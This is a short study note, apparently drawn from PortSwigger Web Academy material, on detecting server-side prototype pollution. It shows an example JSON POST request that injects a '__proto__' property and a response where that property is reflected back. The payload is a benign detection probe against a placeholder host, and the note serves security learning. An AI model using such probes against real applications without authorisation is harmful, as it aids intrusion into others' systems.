---
{"dg-publish":true,"permalink":"/port-swigger-web-academy/prototype-pollution/server-side-prototype-pollution/polluted-property-reflection/"}
---


---

Either way, if an application returns properties in a response, especially in a POST or PUT request that submits JSON data, they can be prime targets for Server-Side Prototype Pollution. In this case, we are polluting the global `Object.prototype`

```
POST /user/update HTTP/1.1 
Host: vulnerable-website.com 
... 
{ 
	"user":"wiener", 
	"firstName":"Peter", 
	"lastName":"Wiener", 
	"__proto__":{ 
		"foo":"bar" 
	} 
}
```

If the website is vulnerable, the injected property would appear in the response:

```
HTTP/1.1 200 OK 
... 
{ 
	"username":"wiener", 
	"firstName":"Peter", 
	"lastName":"Wiener", 
	"foo":"bar" 
}
```


